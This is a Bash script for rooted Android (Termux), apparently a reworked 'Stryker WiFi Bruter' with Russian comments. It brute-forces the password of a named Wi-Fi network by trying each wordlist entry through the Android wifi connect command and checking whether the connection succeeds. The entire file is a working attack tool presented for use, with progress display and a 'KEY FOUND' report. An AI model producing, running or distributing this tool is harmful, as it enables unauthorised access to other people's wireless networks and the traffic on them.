#!/data/data/com.termux/files/usr/bin/bash

# Проверка, запущен ли скрипт от root
if [ "${EUID:-$(id -u)}" -ne 0 ]; then
    echo "Error: This script must be run as root (UID 0)."
    exit 1
fi

# Стандартные значения
DEFAULT_INTERVAL=0.5
DEFAULT_VERSION=2

# Справка
usage() {
    cat << EOF
⚡Stryker WiFi Bruter⚡ - by @zalexdev from strykerdefence.com
👉 Reworked by @Mirivan with ❤️
Version: 2.0
Usage: $0 -s <SSID> -w <wordlist> [-i <interval>] [-v <version>]
  -s Network SSID
  -w Passwords wordlist file
  -i SSID connection check interval (default: $DEFAULT_INTERVAL)
  -v WPA version (default: $DEFAULT_VERSION)
  -h Show this help
EOF
    exit 1
}

# Функция для вывода текста по середине экрана терминала
center_text() {
    local text="$1"
    local width="${2:-$(stty size 2>/dev/null | cut -d' ' -f2 || echo 80)}"
    local padding=$(( (width - ${#text}) / 2 ))
    printf "%*s%s%*s\n" $padding "" "$text" $padding ""
}

# Парсинг аргументов
interval="$DEFAULT_INTERVAL"
version="$DEFAULT_VERSION"

while getopts "s:w:i:v:" opt; do
    case $opt in
        s) ssid="$OPTARG" ;;
        w) wordlist="$OPTARG" ;;
        i) interval="$OPTARG" ;;
        v) version="$OPTARG" ;;
        *) usage ;;
    esac
done

# Проверка аргументов
if ! [[ "$interval" =~ ^[0-9]+(\.[0-9]+)?$ ]]; then
    echo "Error: Interval must be a positive number (seconds). Got: '$interval'."
    exit 1
fi

if ! [[ "$version" =~ ^[1-9]+$ ]]; then
    echo "Error: Version must be a positive integer. Got: '$version'."
    exit 1
fi

[[ -z "$ssid" || -z "$wordlist" ]] && usage
[[ -f "$wordlist" ]] || { echo "Error: Wordlist file '$wordlist' not found."; exit 1; }

# Получаем количество валидных паролей в словаре
total_passwords=$(grep -c '^.\{8,\}' "$wordlist")

if [ "$total_passwords" -eq 0 ]; then
    echo "Error: Wordlist contains no valid passwords (there must be an entry of at least 8 characters per line)."
    exit 1
fi

echo "Loaded $total_passwords valid passwords."

# Начало работы
echo "Let's start bruteforcing..."
echo

start_time=$(date +%s)
checked_lines=0

# Выводим разметку вывода
center_text "SWB 2.0"
echo
printf "    %d/%d keys tested (%d k/s)\n" "0" "$total_passwords" "0"
center_text "Current passphrase: "
echo

# Читаем словарь и отрабатываем пароли
while IFS= read -r password || [[ -n "$password" ]]; do
    if [[ ${#password} -ge 8 ]]; then
        ((checked_lines++))
        
        percentage=$((checked_lines * 100 / total_passwords))
        current_time=$(date +%s)
        elapsed=$((current_time - start_time))
        keys_per_second=$(( checked_lines / (elapsed > 0 ? elapsed : 1) ))
        
        printf "\033[s"
        
        printf "\033[3A"
        printf "\r\033[K"
        printf "    %d/%d keys tested (%d k/s)" "$checked_lines" "$total_passwords" "$keys_per_second"
        
        printf "\033[1B"
        printf "\r\033[K"
        center_text "Current passphrase: $password"
        
        printf "\033[u"
        
        # Здесь я сделал трюк с timeout, потому что бывают ситуации когда функционал скрипта проходит дальше, минуя окончание работы вызова API
        timeout 10s cmd -w wifi connect-network "$ssid" "wpa$version" "$password" </dev/null >/dev/null 2>&1
        
        sleep $interval
        
        # Проверяем подключились ли к сети
        if [[ $(cmd -w wifi status </dev/null) == *"$ssid"* ]]; then
            printf "\033[2A"
            printf "\r\033[K"
            center_text "KEY FOUND! [ $password ]"
            printf "\033[1B"
            exit 0
        fi
    fi
done < "$wordlist"

# Блок на случай если ни один пароль не подошел
printf "\033[2A"
printf "\r\033[K"
center_text "KEY NOT FOUND"
printf "\033[1B"
echo "Tip: You can increase the connection check delay using the argument: i"
exit 1